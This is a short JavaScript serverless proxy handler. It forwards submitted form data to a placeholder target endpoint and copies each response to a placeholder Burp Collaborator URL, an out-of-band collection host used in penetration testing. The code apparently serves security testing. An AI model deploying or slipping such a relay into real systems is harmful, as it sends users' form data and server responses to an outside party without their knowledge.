// proxy.js

exports.handler = async (event, context) => {
  const formData = new URLSearchParams(event.body).toString();
  const proxyUrl = 'http://example.com'; // Replace with your target endpoint

  try {
    const response = await fetch(proxyUrl, {
      method: 'POST',
      body: formData,
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
    });

    const responseData = await response.text();

    // Send response data to Burp Collaborator
    await sendToBurpCollaborator(responseData);

    return {
      statusCode: 200,
      body: responseData,
    };
  } catch (error) {
    console.error('Error:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ error: 'Internal Server Error' }),
    };
  }
};

async function sendToBurpCollaborator(data) {
  const burpCollaboratorUrl = 'YOUR_BURP_COLLABORATOR_URL';
  
  // Send data to Burp Collaborator
  await fetch(burpCollaboratorUrl, {
    method: 'POST',
    body: data,
  });
}
